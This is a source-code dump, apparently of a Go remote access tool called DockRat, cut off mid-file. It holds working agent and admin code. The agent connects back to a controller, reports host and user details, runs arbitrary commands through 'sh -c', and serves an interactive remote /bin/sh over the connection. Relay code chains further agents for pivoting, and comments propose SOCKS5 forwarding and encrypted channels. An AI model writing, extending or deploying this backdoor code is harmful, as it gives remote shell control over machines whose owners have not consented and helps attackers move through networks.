@@ -1,0 +1,1271 @@
+子文件夹：./cmd
+子文件夹：./cmd/admin
+文件：./cmd/admin/main.go
+内容：
+
+package main
+
+import (
+	"log"
+
+	"github.com/Singert/DockRat/core/network"
+	"github.com/Singert/DockRat/core/protocol"
+	"github.com/Singert/DockRat/core/node"
+)
+
+var registry = node.NewRegistry()
+
+func main() {
+	log.Println("[+] Admin starting...")
+
+	// 启动控制台命令处理
+	go protocol.StartConsole(registry)
+
+	// 启动监听并处理 Agent 连接
+	network.StartListener(":9999", registry)
+}
+
+
+/*
+响应消息（如 MsgResponse）缓存起来，以便在控制台中输出最近一条响应？
+你也可以将 MsgShell 输出定向到带颜色或带提示的终端 UI，后续支持退出、上传等命令扩展。
+如需进一步支持 shell 会话保持、窗口调整、或 stdout 缓存，
+*/
+
+子文件夹：./cmd/agent
+文件：./cmd/agent/main.go
+内容：
+package main
+
+import (
+	"encoding/json"
+	"log"
+	"net"
+	"os"
+	"runtime"
+
+	"github.com/Singert/DockRat/core/network"
+	"github.com/Singert/DockRat/core/protocol"
+)
+
+func main() {
+	addr := "127.0.0.1:9999"
+
+	if len(os.Args) > 1 {
+		addr = os.Args[1]
+	} else if env := os.Getenv("DOCKRAT_CONNECT"); env != "" {
+		addr = env
+	}
+
+	conn, err := net.Dial("tcp", addr)
+	if err != nil {
+		log.Fatalf("[-] Failed to connect to %s: %v", addr, err)
+	}
+	log.Printf("[+] Connected to %s", addr)
+
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USER")
+	if username == "" {
+		username = os.Getenv("USERNAME")
+	}
+
+	payload := protocol.HandshakePayload{
+		Hostname: hostname,
+		Username: username,
+		OS:       runtime.GOOS,
+	}
+	payloadBytes, _ := json.Marshal(payload)
+
+	msg := protocol.Message{
+		Type:    protocol.MsgHandshake,
+		Payload: payloadBytes,
+	}
+
+	data, err := protocol.EncodeMessage(msg)
+	if err != nil {
+		log.Fatalf("[-] Failed to encode message: %v", err)
+	}
+
+	_, err = conn.Write(data)
+	if err != nil {
+		log.Fatalf("[-] Failed to send message: %v", err)
+	}
+
+	log.Println("[+] Handshake message sent")
+
+	network.StartAgent(conn)
+}
+
+/*是否继续实现：
+
+    🐚 持久化 shell 模式（交互式 stdin/stdout）
+
+    🛰️ socks5 转发或端口映射
+
+    🔐 TLS/AES 加密通信层
+
+你可以指定想优先开发的子模块。 */
+
+子文件夹：./core
+子文件夹：./core/common
+文件：./core/common/config.go
+内容：
+package common
+文件：./core/common/id_allocator.go
+内容：
+package common
+
+import (
+	"errors"
+	"sync"
+)
+
+type IDAllocator struct {
+	start  int
+	count  int
+	cursor int
+	used   map[int]bool
+	mu     sync.Mutex
+}
+
+func NewIDAllocator(start, count int) *IDAllocator {
+	return &IDAllocator{
+		start:  start,
+		count:  count,
+		cursor: 0,
+		used:   make(map[int]bool),
+	}
+}
+
+// 分配下一个可用 ID
+func (a *IDAllocator) Next() (int, error) {
+	a.mu.Lock()
+	defer a.mu.Unlock()
+
+	for i := 0; i < a.count; i++ {
+		id := a.start + (a.cursor+i)%a.count
+		if !a.used[id] {
+			a.used[id] = true
+			a.cursor = (a.cursor + i + 1) % a.count
+			return id, nil
+		}
+	}
+	return -1, errors.New("no available ID in range")
+}
+
+// 手动释放 ID（用于失败回滚）
+func (a *IDAllocator) Free(id int) {
+	a.mu.Lock()
+	defer a.mu.Unlock()
+	delete(a.used, id)
+}
+
+文件：./core/common/logger.go
+内容：
+package common
+
+子文件夹：./core/crypto
+文件：./core/crypto/cipher.go
+内容：
+package crypto
+子文件夹：./core/network
+文件：./core/network/connection.go
+内容：
+package network
+
+import (
+	"encoding/json"
+	"fmt"
+	"io"
+	"log"
+	"net"
+
+	"github.com/Singert/DockRat/core/node"
+	"github.com/Singert/DockRat/core/protocol"
+)
+
+// -------------------------- admin专用的监听函数 -------------------------
+
+func StartListener(addr string, registry *node.Registry) {
+	ln, err := net.Listen("tcp", addr)
+	if err != nil {
+		log.Fatalf("[!] Failed to listen on %s: %v", addr, err)
+	}
+	log.Printf("[+] Listening on %s", addr)
+
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			log.Println("[!] Accept error:", err)
+			continue
+		}
+		go handleConnection(conn, registry)
+	}
+}
+
+func handleConnection(conn net.Conn, registry *node.Registry) {
+	log.Printf("[+] New connection from %s", conn.RemoteAddr())
+
+	lengthBuf := make([]byte, 4)
+	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
+		log.Println("[!] Failed to read message length:", err)
+		conn.Close()
+		return
+	}
+	length := bytesToUint32(lengthBuf)
+	data := make([]byte, length)
+	if _, err := io.ReadFull(conn, data); err != nil {
+		log.Println("[!] Failed to read message body:", err)
+		conn.Close()
+		return
+	}
+
+	msg, err := protocol.DecodeMessage(data)
+	if err != nil {
+		log.Println("[!] Failed to decode message:", err)
+		conn.Close()
+		return
+	}
+
+	if msg.Type == protocol.MsgHandshake {
+		var payload protocol.HandshakePayload
+		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+			log.Println("[!] Failed to decode handshake payload:", err)
+			conn.Close()
+			return
+		}
+
+		n := &node.Node{
+			Conn:     conn,
+			Hostname: payload.Hostname,
+			Username: payload.Username,
+			OS:       payload.OS,
+			Addr:     conn.RemoteAddr().String(),
+		}
+		id := registry.Add(n)
+		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)
+
+		go handleAgentMessages(n, registry)
+	} else {
+		log.Println("[!] Unknown message type:", msg.Type)
+		conn.Close()
+	}
+}
+
+func handleAgentMessages(n *node.Node, registry *node.Registry) {
+	conn := n.Conn
+	for {
+		lengthBuf := make([]byte, 4)
+		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
+			log.Printf("[-] Node %d disconnected: %v", n.ID, err)
+			registry.Remove(n.ID)
+			conn.Close()
+			return
+		}
+		length := bytesToUint32(lengthBuf)
+		data := make([]byte, length)
+		if _, err := io.ReadFull(conn, data); err != nil {
+			log.Printf("[-] Node %d read failed: %v", n.ID, err)
+			registry.Remove(n.ID)
+			conn.Close()
+			return
+		}
+
+		msg, err := protocol.DecodeMessage(data)
+		if err != nil {
+			log.Printf("[-] Node %d decode failed: %v", n.ID, err)
+			continue
+		}
+
+		switch msg.Type {
+		case protocol.MsgResponse:
+			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
+		case protocol.MsgShell:
+			fmt.Print(string(msg.Payload))
+		case protocol.MsgRelayReady:
+			var payload protocol.RelayReadyPayload
+			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+				log.Printf("[-] RelayReady decode failed: %v", err)
+				return
+			}
+			// nodeInfo, ok := registry.Get(payload.SelfID)
+			// ip := "(unknown)"
+			// if ok {
+			// 	ip = nodeInfo.Addr
+			// }
+			log.Printf("[Relay Ready] Node %d (%s) is now acting as relay ", payload.SelfID, payload.ListenAddr)
+
+			// 可选：标记该 node 为 relay（拓扑用途）
+			// if relayNode, ok := registry.Get(payload.SelfID); ok {
+			// 	// 如果你有 isRelay 字段，可在此设置
+			// 	log.Printf("[*] Relay node %d confirmed ready", payload.SelfID)
+			// }
+		case protocol.MsgRelayRegister:
+			var payload protocol.RelayRegisterPayload
+			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+				log.Printf("[-] RelayRegister decode failed: %v", err)
+				return
+			}
+
+			newNode := payload.Node
+			newID := newNode.ID
+
+			// 检查是否冲突
+			if _, exists := registry.Get(newID); exists {
+				log.Printf("[-] Duplicate node ID %d rejected", newID)
+				resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
+				sendAck(n.Conn, protocol.MsgRelayError, resp)
+				return
+			}
+
+			// 注册
+			registry.AddWithID(&newNode)
+			registry.NodeGraph.SetParent(newID, payload.ParentID)
+			log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)
+
+			resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
+			sendAck(n.Conn, protocol.MsgRelayAck, resp)
+		case protocol.MsgRelayPacket:
+			var pkt protocol.RelayPacket
+			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
+				log.Printf("[-] RelayPacket decode failed: %v", err)
+				return
+			}
+			target, ok := registry.Get(pkt.DestID)
+			if !ok {
+				log.Printf("[-] Unknown target ID %d for relay", pkt.DestID)
+				return
+			}
+			_, err := target.Conn.Write(pkt.Data)
+			if err != nil {
+				log.Printf("[-] Relay forward to %d failed: %v", pkt.DestID, err)
+				registry.Remove(pkt.DestID)
+				registry.NodeGraph.RemoveNode(pkt.DestID)
+			}
+
+		default:
+			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
+		}
+	}
+}
+func sendAck(conn net.Conn, msgType protocol.MessageType, ack protocol.RelayAckPayload) {
+	data, _ := json.Marshal(ack)
+	msg := protocol.Message{
+		Type:    msgType,
+		Payload: data,
+	}
+	buf, _ := protocol.EncodeMessage(msg)
+	conn.Write(buf)
+}
+
+文件：./core/network/dispatcher.go
+内容：
+package network
+
+import (
+	"encoding/json"
+	"io"
+	"log"
+	"net"
+	"os/exec"
+	"strings"
+
+	"github.com/Singert/DockRat/core/common"
+	"github.com/Singert/DockRat/core/node"
+	"github.com/Singert/DockRat/core/protocol"
+	"github.com/creack/pty"
+)
+
+var shellStarted = false
+var shellStdin io.WriteCloser
+var relayCtx *RelayContext // 全局变量，供 MsgRelayPacket 使用
+
+func StartAgent(conn net.Conn) {
+	for {
+		lengthBuf := make([]byte, 4)
+		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
+			log.Printf("[-] Connection closed or failed: %v", err)
+			return
+		}
+		length := bytesToUint32(lengthBuf)
+		data := make([]byte, length)
+		if _, err := io.ReadFull(conn, data); err != nil {
+			log.Printf("[-] Failed to read message body: %v", err)
+			return
+		}
+
+		msg, err := protocol.DecodeMessage(data)
+		if err != nil {
+			log.Printf("[-] Decode error: %v", err)
+			continue
+		}
+
+		switch msg.Type {
+		case protocol.MsgCommand:
+			handleCommand(msg, conn)
+		case protocol.MsgShell:
+			handleShellPTY(msg, conn)
+		case protocol.MsgStartRelay:
+			handleStartRelay(msg, conn)
+		case protocol.MsgRelayAck:
+			var ack protocol.RelayAckPayload
+			if err := json.Unmarshal(msg.Payload, &ack); err != nil {
+				log.Println("[-] Decode relay_ack failed:", err)
+				return
+			}
+			log.Printf("[+] Relay register success: %s", ack.Message)
+
+		case protocol.MsgRelayError:
+			var errMsg protocol.RelayAckPayload
+			if err := json.Unmarshal(msg.Payload, &errMsg); err != nil {
+				log.Println("[-] Decode relay_error failed:", err)
+				return
+			}
+			log.Printf("[!] Relay register failed: %s", errMsg.Message)
+		case protocol.MsgRelayPacket:
+			var pkt protocol.RelayPacket
+			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
+				log.Println("[-] Decode relay_packet failed:", err)
+				break
+			}
+			if relayCtx != nil {
+				HandleRelayPacket(relayCtx, pkt)
+			} else {
+				log.Println("[-] Relay context not initialized")
+			}
+		default:
+			log.Println("[-] Unknown message type:", msg.Type)
+		}
+	}
+}
+
+func handleCommand(msg protocol.Message, conn net.Conn) {
+	var payload map[string]string
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] Command unmarshal error:", err)
+		return
+	}
+	cmdStr := payload["cmd"]
+	log.Println("[+] Received command:", cmdStr)
+
+	output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
+	if err != nil {
+		output = append(output, []byte("\n[!] Command error: "+err.Error())...)
+	}
+
+	resp := protocol.Message{
+		Type:    protocol.MsgResponse,
+		Payload: output,
+	}
+	data, _ := protocol.EncodeMessage(resp)
+	conn.Write(data)
+}
+
+func handleShellPTY(msg protocol.Message, conn net.Conn) {
+	line := string(msg.Payload)
+
+	if !shellStarted {
+		cmd := exec.Command("/bin/sh")
+		ptmx, err := pty.Start(cmd)
+		if err != nil {
+			log.Println("[-] Failed to start pty:", err)
+			return
+		}
+		shellStarted = true
+		shellStdin = ptmx
+
+		go func() {
+			buf := make([]byte, 1024)
+			for {
+				n, err := ptmx.Read(buf)
+				if err != nil {
+					log.Println("[-] Shell read error:", err)
+					return
+				}
+				msg := protocol.Message{
+					Type:    protocol.MsgShell,
+					Payload: buf[:n],
+				}
+				data, err := protocol.EncodeMessage(msg)
+				if err != nil {
+					log.Println("[-] Shell encode error:", err)
+					return
+				}
+				_, err = conn.Write(data)
+				if err != nil {
+					log.Println("[-] Shell write error:", err)
+					return
+				}
+			}
+		}()
+		return
+	}
+
+	// 已启动 shell，则写入 stdin
+	if !strings.HasSuffix(line, "\n") {
+		line += "\n"
+	}
+	_, err := shellStdin.Write([]byte(line))
+	if err != nil {
+		log.Println("[-] Write to shell error:", err)
+	}
+}
+func handleStartRelay(msg protocol.Message, conn net.Conn) {
+	var payload protocol.StartRelayPayload
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] StartRelay payload decode error:", err)
+		return
+	}
+
+	log.Printf("[*] Received startrelay command: listen on %s, ID range [%d ~ %d]",
+		payload.ListenAddr, payload.IDStart, payload.IDStart+payload.Count-1)
+
+	// 创建本地结构
+	reg := node.NewRegistry()
+	topo := node.NewNodeGraph()
+	alloc := common.NewIDAllocator(payload.IDStart, payload.Count)
+
+	ctx := &RelayContext{
+		SelfID:      payload.SelfID, // 后续可传入或由自身记录
+		Registry:    reg,
+		Topology:    topo,
+		IDAllocator: alloc,
+		Upstream:    conn, // 保持与 admin 的通道
+	}
+	relayCtx = ctx
+	go StartRelayListener(payload.ListenAddr, ctx)
+
+	// 上报成功
+	ack := protocol.RelayReadyPayload{
+		SelfID:     -1, // 此处为当前 agent 自己的 ID，建议 future enhancement 填入
+		ListenAddr: payload.ListenAddr,
+	}
+	data, _ := json.Marshal(ack)
+	resp := protocol.Message{
+		Type:    protocol.MsgRelayReady,
+		Payload: data,
+	}
+	buf, _ := protocol.EncodeMessage(resp)
+	conn.Write(buf)
+}
+
+/*
+✅ 补充建议（结构更优雅方案）
+
+后续可以考虑：
+
+    拆分 relay 与普通 agent 启动逻辑：
+
+        StartBasicAgent(conn)
+
+        StartRelayAgent(conn, ctx)
+
+    将 relay 端启动逻辑独立于 StartAgent()，更便于测试与维护。*/
+
+文件：./core/network/packet.go
+内容：
+package network
+文件：./core/network/relay.go
+内容：
+package network
+
+import (
+	"encoding/json"
+	"io"
+	"log"
+	"net"
+
+	"github.com/Singert/DockRat/core/common"
+	"github.com/Singert/DockRat/core/node"
+	"github.com/Singert/DockRat/core/protocol"
+)
+
+// -------------------------------中继节点专用监听函数 -------------------------------
+
+// RelayContext 持有本 relay 节点的所有状态
+type RelayContext struct {
+	SelfID      int
+	Registry    *node.Registry
+	Topology    *node.NodeGraph
+	IDAllocator *common.IDAllocator
+	Upstream    net.Conn // 与上级 admin 或 relay 的连接
+}
+
+// 启动 relay 监听器
+func StartRelayListener(addr string, ctx *RelayContext) {
+	ln, err := net.Listen("tcp", addr)
+	if err != nil {
+		log.Fatalf("[-] Relay listen failed on %s: %v", addr, err)
+	}
+	log.Printf("[Relay %d] Listening on %s", ctx.SelfID, addr)
+
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			log.Println("[-] Relay accept error:", err)
+			continue
+		}
+		go HandleRelayConnection(conn, ctx)
+	}
+}
+
+// 接收 agentY 并分配 ID，注册后上报给上级
+func HandleRelayConnection(conn net.Conn, ctx *RelayContext) {
+	log.Printf("[Relay %d] New connection from %s", ctx.SelfID, conn.RemoteAddr())
+
+	// 读取消息长度与内容（与 handleConnection 一致）
+	lengthBuf := make([]byte, 4)
+	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
+		log.Println("[-] Read length failed:", err)
+		conn.Close()
+		return
+	}
+	length := bytesToUint32(lengthBuf)
+	data := make([]byte, length)
+	if _, err := io.ReadFull(conn, data); err != nil {
+		log.Println("[-] Read payload failed:", err)
+		conn.Close()
+		return
+	}
+
+	msg, err := protocol.DecodeMessage(data)
+	if err != nil || msg.Type != protocol.MsgHandshake {
+		log.Println("[-] Invalid or non-handshake message")
+		conn.Close()
+		return
+	}
+
+	var payload protocol.HandshakePayload
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] Handshake decode failed:", err)
+		conn.Close()
+		return
+	}
+
+	// 分配 ID
+	newID, err := ctx.IDAllocator.Next()
+	if err != nil {
+		log.Println("[-] No available ID for new node")
+		conn.Close()
+		return
+	}
+
+	n := &node.Node{
+		ID:       newID,
+		Conn:     conn,
+		Hostname: payload.Hostname,
+		Username: payload.Username,
+		OS:       payload.OS,
+		Addr:     conn.RemoteAddr().String(),
+	}
+
+	ctx.Registry.AddWithID(n)
+	ctx.Topology.SetParent(n.ID, ctx.SelfID)
+	log.Printf("[Relay %d] Registered child ID %d (%s@%s)", ctx.SelfID, n.ID, n.Username, n.Hostname)
+
+	// 上报给 admin
+	liteNode := &node.Node{
+		ID:       newID,
+		Hostname: payload.Hostname,
+		Username: payload.Username,
+		OS:       payload.OS,
+		Addr:     conn.RemoteAddr().String(),
+	}
+	report := protocol.RelayRegisterPayload{
+		ParentID: ctx.SelfID,
+		Node:     *liteNode,
+	}
+	reportBytes, _ := json.Marshal(report)
+	msgOut := protocol.Message{
+		Type:    protocol.MsgRelayRegister,
+		Payload: reportBytes,
+	}
+	buf, _ := protocol.EncodeMessage(msgOut)
+	ctx.Upstream.Write(buf)
+
+	// 启动消息读取
+	go HandleRelayAgentMessages(n, ctx)
+}
+
+// 该函数与 admin 的 handleAgentMessages() 类似，
+// 但 relay 不直接处理业务消息，
+// 而是将其封装为 RelayPacket 并转发给 ctx.Upstream（admin）。
+func HandleRelayAgentMessages(n *node.Node, ctx *RelayContext) {
+	conn := n.Conn
+	for {
+		lengthBuf := make([]byte, 4)
+		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
+			log.Printf("[Relay] Node %d disconnected: %v", n.ID, err)
+			ctx.Registry.Remove(n.ID)
+			ctx.Topology.RemoveNode(n.ID)
+			ctx.IDAllocator.Free(n.ID)
+			conn.Close()
+			return
+		}
+		length := bytesToUint32(lengthBuf)
+		data := make([]byte, length)
+		if _, err := io.ReadFull(conn, data); err != nil {
+			log.Printf("[Relay] Node %d read failed: %v", n.ID, err)
+			ctx.Registry.Remove(n.ID)
+			ctx.Topology.RemoveNode(n.ID)
+			ctx.IDAllocator.Free(n.ID)
+			conn.Close()
+			return
+		}
+
+		// 打包为 RelayPacket 上送
+		pkt := protocol.RelayPacket{
+			DestID: n.ID,
+			Data:   data,
+		}
+		pktBytes, _ := json.Marshal(pkt)
+		msg := protocol.Message{
+			Type:    protocol.MsgRelayPacket,
+			Payload: pktBytes,
+		}
+		out, _ := protocol.EncodeMessage(msg)
+		ctx.Upstream.Write(out)
+	}
+}
+
+// 该函数用于 relay 收到一个 RelayPacket 后，向下路由目标 agent。
+func HandleRelayPacket(ctx *RelayContext, pkt protocol.RelayPacket) {
+	target, ok := ctx.Registry.Get(pkt.DestID)
+	if !ok {
+		log.Printf("[-] Relay: unknown target ID %d", pkt.DestID)
+		return
+	}
+	_, err := target.Conn.Write(pkt.Data)
+	if err != nil {
+		log.Printf("[-] Relay: write to node %d failed: %v", pkt.DestID, err)
+		ctx.Registry.Remove(pkt.DestID)
+		ctx.Topology.RemoveNode(pkt.DestID)
+		ctx.IDAllocator.Free(pkt.DestID)
+	}
+}
+
+文件：./core/network/utils.go
+内容：
+package network
+
+func bytesToUint32(b []byte) uint32 {
+	return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
+}
+
+子文件夹：./core/node
+文件：./core/node/registry.go
+内容：
+// File: core/node/registry.go
+package node
+
+import (
+	"fmt"
+	"net"
+	"sync"
+)
+
+type Node struct {
+	ID       int
+	Conn     net.Conn
+	Hostname string
+	Username string
+	OS       string
+	Addr     string
+}
+
+type Registry struct {
+	nodes     map[int]*Node
+	mu        sync.Mutex
+	nextID    int
+	NodeGraph *NodeGraph
+}
+
+func NewRegistry() *Registry {
+	return &Registry{
+		nodes:     make(map[int]*Node),
+		NodeGraph: NewNodeGraph(), // 初始化拓扑图
+	}
+}
+
+func (r *Registry) Add(node *Node) int {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	id := r.nextID
+	node.ID = id
+	r.nodes[id] = node
+	r.nextID++
+	return id
+}
+
+func (r *Registry) List() []*Node {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	nodes := make([]*Node, 0, len(r.nodes))
+	for _, node := range r.nodes {
+		nodes = append(nodes, node)
+	}
+	return nodes
+}
+
+func (r *Registry) Get(id int) (*Node, bool) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	node, ok := r.nodes[id]
+	return node, ok
+}
+
+func (r *Registry) Remove(id int) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+	delete(r.nodes, id)
+}
+
+func (n *Node) String() string {
+	return fmt.Sprintf("Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s",
+		n.ID, n.Addr, n.Hostname, n.Username, n.OS)
+}
+
+func (r *Registry) AddWithID(n *Node) {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	id := n.ID
+	r.nodes[id] = n
+	if id >= r.nextID {
+		r.nextID = id + 1
+	}
+}
+
+文件：./core/node/topology.go
+内容：
+// File: core/node/topology.go
+package node
+
+import (
+	"fmt"
+	"sync"
+)
+
+type NodeGraph struct {
+	mu        sync.RWMutex
+	parentMap map[int]int   // childID → parentID
+	childMap  map[int][]int // parentID → []childID
+}
+
+func NewNodeGraph() *NodeGraph {
+	return &NodeGraph{
+		parentMap: make(map[int]int),
+		childMap:  make(map[int][]int),
+	}
+}
+
+// 设置 child 的父节点（会自动从原父节点解绑）
+func (g *NodeGraph) SetParent(childID int, parentID int) {
+	g.mu.Lock()
+	defer g.mu.Unlock()
+
+	// 如果已有父节点，则从原父节点的子列表中移除
+	if oldParent, ok := g.parentMap[childID]; ok {
+		children := g.childMap[oldParent]
+		newChildren := []int{}
+		for _, cid := range children {
+			if cid != childID {
+				newChildren = append(newChildren, cid)
+			}
+		}
+		g.childMap[oldParent] = newChildren
+	}
+
+	// 设置新的父子关系
+	g.parentMap[childID] = parentID
+	g.childMap[parentID] = append(g.childMap[parentID], childID)
+}
+
+// 获取某个节点的所有子节点
+func (g *NodeGraph) GetChildren(parentID int) []int {
+	g.mu.RLock()
+	defer g.mu.RUnlock()
+	return append([]int{}, g.childMap[parentID]...) // 返回副本防止外部修改
+}
+
+// 获取某个子节点的父节点 ID，若无则为 -1
+func (g *NodeGraph) GetParent(childID int) int {
+	g.mu.RLock()
+	defer g.mu.RUnlock()
+	if pid, ok := g.parentMap[childID]; ok {
+		return pid
+	}
+	return -1
+}
+
+// 删除节点及其拓扑关系
+func (g *NodeGraph) RemoveNode(id int) {
+	g.mu.Lock()
+	defer g.mu.Unlock()
+
+	// 移除父指针
+	delete(g.parentMap, id)
+
+	// 移除子节点列表
+	delete(g.childMap, id)
+
+	// 从其他人的子列表中删除该节点
+	for pid, children := range g.childMap {
+		newChildren := []int{}
+		for _, cid := range children {
+			if cid != id {
+				newChildren = append(newChildren, cid)
+			}
+		}
+		g.childMap[pid] = newChildren
+	}
+}
+func (r *Registry) PrintTopology() {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	fmt.Println("[+] Node Topology:")
+	roots := []int{}
+	for id := range r.nodes {
+		if r.NodeGraph.GetParent(id) == -1 {
+			roots = append(roots, id)
+		}
+	}
+
+	for _, rootID := range roots {
+		r.printSubtree(rootID, 0)
+	}
+}
+
+func (r *Registry) printSubtree(id int, depth int) {
+	node := r.nodes[id]
+	prefix := ""
+	for i := 0; i < depth; i++ {
+		prefix += "  "
+	}
+	fmt.Printf("%s|- Node[%d] %s@%s (%s)\n", prefix, node.ID, node.Username, node.Hostname, node.OS)
+
+	children := r.NodeGraph.GetChildren(id)
+	for _, cid := range children {
+		r.printSubtree(cid, depth+1)
+	}
+}
+
+子文件夹：./core/protocol
+文件：./core/protocol/command.go
+内容：
+package protocol
+
+import (
+	"bufio"
+	"encoding/json"
+	"fmt"
+	"os"
+	"strings"
+
+	"github.com/Singert/DockRat/core/node"
+)
+
+func StartConsole(registry *node.Registry) {
+	scanner := bufio.NewScanner(os.Stdin)
+	for {
+		fmt.Print("(admin) >> ")
+		if !scanner.Scan() {
+			break
+		}
+		input := strings.TrimSpace(scanner.Text())
+		if input == "" {
+			continue
+		}
+
+		tokens := strings.SplitN(input, " ", 2)
+		cmd := tokens[0]
+		arg := ""
+		if len(tokens) > 1 {
+			arg = tokens[1]
+		}
+
+		switch cmd {
+		case "detail":
+			handleDetail(registry)
+		case "exec":
+			handleExec(arg, registry)
+		case "shell":
+			handleShell(arg, registry)
+		case "startrelay":
+			handleStartRelay(arg, registry)
+		case "topo":
+			handleTopo(registry)
+
+		default:
+			fmt.Println("[-] Unknown command")
+		}
+	}
+}
+
+func handleDetail(reg *node.Registry) {
+	nodes := reg.List()
+	fmt.Println("[+] Connected nodes:")
+	for _, n := range nodes {
+		fmt.Printf("  Node[%d] -> IP: %s, Hostname: %s, User: %s, OS: %s\n",
+			n.ID, n.Addr, n.Hostname, n.Username, n.OS)
+	}
+}
+
+func handleExec(arg string, reg *node.Registry) {
+	parts := strings.SplitN(arg, " ", 2)
+	if len(parts) != 2 {
+		fmt.Println("[-] Usage: exec <id> <command>")
+		return
+	}
+	var nid int
+	fmt.Sscanf(parts[0], "%d", &nid)
+	cmdPayload := map[string]string{"cmd": parts[1]}
+	data, _ := json.Marshal(cmdPayload)
+	msg := Message{Type: MsgCommand, Payload: data}
+
+	if err := sendMessageOrRelay(nid, msg, reg); err != nil {
+		fmt.Println("[-]", err)
+	} else {
+		fmt.Println("[+] Exec command sent.")
+	}
+}
+
+func handleShell(arg string, reg *node.Registry) {
+	var nid int
+	fmt.Sscanf(arg, "%d", &nid)
+
+	msg := Message{Type: MsgShell, Payload: []byte("start shell")}
+	if err := sendMessageOrRelay(nid, msg, reg); err != nil {
+		fmt.Println("[-]", err)
+		return
+	}
+
+	fmt.Println("[+] Shell started. Type commands (type 'exit' to quit):")
+	scanner := bufio.NewScanner(os.Stdin)
+	for {
+		fmt.Print("remote$ ")
+		if !scanner.Scan() {
+			break
+		}
+		line := scanner.Text()
+		if strings.TrimSpace(line) == "exit" {
+			break
+		}
+		cmdMsg := Message{Type: MsgShell, Payload: []byte(line + "\n")}
+		if err := sendMessageOrRelay(nid, cmdMsg, reg); err != nil {
+			fmt.Println("[-] Shell write failed:", err)
+			break
+		}
+	}
+}
+
+func handleStartRelay(arg string, reg *node.Registry) {
+	parts := strings.Fields(arg)
+	if len(parts) != 2 {
+		fmt.Println("Usage: startrelay <node_id> <port>")
+		return
+	}
+	var nid int
+	port := parts[1]
+	fmt.Sscanf(parts[0], "%d", &nid)
+
+	n, ok := reg.Get(nid)
+	if !ok {
+		fmt.Println("[-] No such node")
+		return
+	}
+
+	// 分配编号段（每个 relay 分配 1000 个 ID）
+	baseID := nid * 1000
+	payload := StartRelayPayload{
+		SelfID:     nid,
+		ListenAddr: ":" + port,
+		IDStart:    baseID + 1,
+		Count:      999,
+	}
+	data, _ := json.Marshal(payload)
+	msg := Message{
+		Type:    MsgStartRelay,
+		Payload: data,
+	}
+	buf, err := EncodeMessage(msg)
+	if err != nil {
+		fmt.Println("[-] Encode failed:", err)
+		return
+	}
+	_, err = n.Conn.Write(buf)
+	if err != nil {
+		fmt.Println("[-] Send failed:", err)
+		return
+	}
+	fmt.Printf("[+] Sent startrelay to node %d, range = [%d ~ %d]\n", nid, payload.IDStart, payload.IDStart+payload.Count-1)
+}
+func handleTopo(reg *node.Registry) {
+	reg.PrintTopology()
+}
+func sendMessageOrRelay(nid int, msg Message, reg *node.Registry) error {
+	data, err := EncodeMessage(msg)
+	if err != nil {
+		return fmt.Errorf("encode failed: %w", err)
+	}
+
+	n, ok := reg.Get(nid)
+	if !ok {
+		return fmt.Errorf("no such node")
+	}
+
+	// 如果是直连 agent，直接发送
+	if n.Conn != nil {
+		_, err := n.Conn.Write(data)
+		return err
+	}
+
+	// 否则构造 RelayPacket
+	parentID := reg.NodeGraph.GetParent(nid)
+	parentNode, ok := reg.Get(parentID)
+	if !ok || parentNode.Conn == nil {
+		return fmt.Errorf("no relay available for node %d", nid)
+	}
+
+	packet := RelayPacket{
+		DestID: nid,
+		Data:   data,
+	}
+	pktBytes, _ := json.Marshal(packet)
+	wrapped := Message{
+		Type:    MsgRelayPacket,
+		Payload: pktBytes,
+	}
+	buf, err := EncodeMessage(wrapped)
+	if err != nil {
+		return fmt.Errorf("relay encode error: %w", err)
+	}
+	fmt.Println("[*] Relay packet to node", nid, "via parent", parentID)
+	fmt.Println("[*] Relay packet :", string(pktBytes))
+	_, err = parentNode.Conn.Write(buf)
+	return err
+}
+
+文件：./core/protocol/message.go
+内容：
+package protocol
+
+import (
+	"bytes"
+	"encoding/binary"
+	"encoding/json"
+	"fmt"
+
+	"github.com/Singert/DockRat/core/node"
+)
+
+// MessageType 定义了消息类型，如 handshake、shell、upload 等
+type MessageType string
+
+const (
+	MsgHandshake MessageType = "handshake"
+	MsgHeartbeat MessageType = "heartbeat"
+	MsgCommand   MessageType = "command"
+	MsgResponse  MessageType = "response"
+	MsgShell     MessageType = "shell"
+
+	// Relay
+	MsgStartRelay    MessageType = "start_relay"    // Admin → agentX：命令其启动 relay 模式
+	MsgRelayReady    MessageType = "relay_ready"    // AgentX → admin：监听启动成功
+	MsgRelayRegister MessageType = "relay_register" // AgentX → admin：上报子节点信息
+	MsgRelayAck      MessageType = "relay_ack"      // Admin → agentX：注册成功确认
+	MsgRelayError    MessageType = "relay_error"    // Admin → agentX：注册失败说明
